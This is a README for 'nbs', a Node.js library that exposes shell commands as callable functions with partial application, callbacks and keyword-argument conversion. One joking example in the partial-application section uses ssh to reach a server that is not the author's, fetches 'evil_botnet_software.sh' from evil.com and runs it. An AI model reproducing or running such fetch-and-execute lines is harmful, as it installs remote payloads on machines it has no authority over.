node-nbs
========

Shelling out with `child_process` is just ... so ... drab. Relieve the tedium
with `nbs`!

```javascript
var sh = require("nbs"),
    curl = sh("curl", {silent: true});
curl("http://httpbin.org/user-agent", function(err, result) {
    console.log(JSON.parse(result)["user-agent"]); // curl/7.30.0
});
// Of course this is a horribly contrived example. You should use `http.get`.
```

Now everything in `$PATH` has node bindings!

Literal Arguments
-----------------

Anything you pass directly to your wrapper function gets passed through.

```javascript
var mkdir = sh("mkdir");
mkdir("example_directory");
```

Multiple arguments can be provided.

```javascript
mkdir("-p", "parent/child");
```

Spaces and the like are automatically escaped.

```javascript
mkdir("Some directory with spaces! Wooo! Rebellion!");
```

Remember that, because this is node, everything is asynchronous, all our calls
will return immediately and execute in parallel. [Libraries like
`async`](https://github.com/caolan/async) or promises are good mechanisms for
organizing this mayhem.

### Argument Expansion

Because `Function.apply` is needlessly ugly, you can simply pass arrays beside
literal arguments.

```javascript
var myFolders = ["folderA", "folderB", "folderC"];
mkdir("-p", "-v", myFolders);
// which is the same as
mkdir.apply(null, ["-p", "-v"].concat(myFolders));
```

You can even have nested lists, and they'll all be expanded upon evaluation.

Partial Application
-------------------

You know, I kinda wish `mkdir` supplied `-p` by default.

```javascript
mkdir = mkdir.partial("-p");
mkdir("another-parent/child");
```

Oh! Look at that! It's okay I guess. I just wish it required **exactly one**
less function call. If only we could apply the partial when creating `mkdir`....

```javascript
var mkdir = sh("mkdir", "-p");
```

Alright. That looks cool, but kinda limited in use.

```javascript
var ssh = sh("ssh"),
    definitelyMyServer = ssh.partial("notmyserver.com", "-p 1234"),
    remoteCurl = definitelyMyServer.partial("curl", "--silent");

remoteCurl("-O", "http://evil.com/evil_botnet_software.sh");
definitelyMyServer("sh", "evil_botnet_software.sh");
// Please only use this on PHP websites
```

Callbacks
---------

Because the output of commands is **occasionally useful**, I guess it might be
**moderately interesting** if there was some way to read them. The easiest way
is with a callback.

```javascript
var _s = require("underscore.string"),
    ls = sh("ls", "-1");
ls(function(err, result) {
    if(err) {
        throw err; // Oh my god! Something horrible must have happened!
    }
    console.log(_s.strip(result).split("\n"));
});
// ["another_parent", "example_directory", ... ]
```

Keyword Arguments
-----------------

As the last argument (before a callback), you may specify keyword arguments as
an object. These keyword arguments get rewritten as follows:

-   Single letter keys get a single dash prepended to them: `-s`
-   Multi-letter keys get two dashes prepended to them: `--long`
-   Integer values get converted to strings
-   Boolean values trigger some special casing (see below)
-   The value is appended after the key, separated by an equals sign:
    `--key=value`

### Boolean Keyword Arguments

It makes sense to think of the keyword arguments as an "options argument".
Fitting this analogy, keyword arguments with boolean values get processed
differently:

-   When true, the keyword gets one or two dashes prepended to it. No value is
    written out.
-   When false, the entire entry is ignored.

As an example, the object

```javascript
{verbose: false, escape: true, color: false, literal: true, a: true}
```

Would translate into

```
--escape --literal -a
```

### Use with a callback

The callback is **always the last** argument. As a result, the call remains
readable with CoffeeScript syntax.

```coffeescript
ls = sh "ls"
ls "-1", all: true, recursive: false, (err, res) ->
    console.log res
```

### "Special" Keyword Arguments

Keys prepended with an _underscore act a bit differently. The following special
arguments are supported

-   `_cwd`: Current working directory
-   `_env`: An object of environment variables
-   `_uid`: The numerical ID or the string username of the user to execute as
-   `_gid`: The numerical ID or the string group of the user to execute as
-   `_encoding`: The encoding of stdout and stderr as a string. [Any encoding
    node supports][] can be passed. If given a falsy value, such as `null`, the
    stream will be treated as binary. Default is `utf8`.
-   `_okCode`: A number or array of numbers representing valid exit codes.
    Defaults to `0`.

  [Any encoding node supports]: http://nodejs.org/api/stream.html#stream_readable_setencoding_encoding

Even More Stuff
---------------

I'm not done writing yet. But there's plenty more features in there, and many
ideas left to implement!

Portability
-----------

Because we're dealing with platform-specific commands, shelling out on Linux and
OS X will almost certainly be different than on Windows. Adding insult to
injury, I haven't even tested this on Windows. Oh well; it's not like Windows
has a significant market share.

See Also
--------

`nbs` is based on the python module, `sh` by Andrew Moffat. [`sh` is hosted on
GitHub.](http://amoffat.github.io/sh/) I even lifted some examples from his
documentation!

`nbs` would be called `sh`, but that name [was already taken by another project
with some similar goals.](http://shjs.tuton.fr/) It's worth checking out too
(although *my* project is *clearly* better). `nbs`'s name is derived from `sh`'s
former name, `pbs`.
